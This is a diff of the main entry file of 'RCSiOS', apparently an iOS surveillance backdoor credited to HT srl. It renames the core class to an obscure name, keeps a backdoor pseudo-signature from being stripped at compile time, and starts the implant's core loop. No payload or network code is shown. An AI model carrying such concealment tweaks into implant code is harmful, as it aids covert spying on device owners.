@@ -1,6 +1,5 @@
 /*
- * RCSiOS
- *  pon pon
+ * RCSiOS version 2.1
  *
  * Created on 08/09/2009
  * Copyright (C) HT srl 2009. All rights reserved
@@ -15,7 +14,7 @@
 #import "RCSITaskManager.h"
 #import "RCSILogger.h"
 #import "RCSIDebug.h"
-
+#import "RCSIGlobals.h"
 
 int main (int argc, const char * argv[])
 {
@@ -23,12 +22,17 @@ int main (int argc, const char * argv[])
   
   // FIXED- fixing string binary patched
   gBackdoorID[14] = gBackdoorID[15] = 0;
-    
-  RCSICore *core = [[RCSICore alloc] init];
+  
+  // fix for compile time strip...
+  char *tmpWmaker = gBackdoorPseduoSign; 
+  tmpWmaker += 1;
+  
+  _i_Core *core = [[_i_Core alloc] init];
 
   [core runMeh];
   
-  [pool release];
   [core release];
+  [pool release];
+
   return 0;
 }
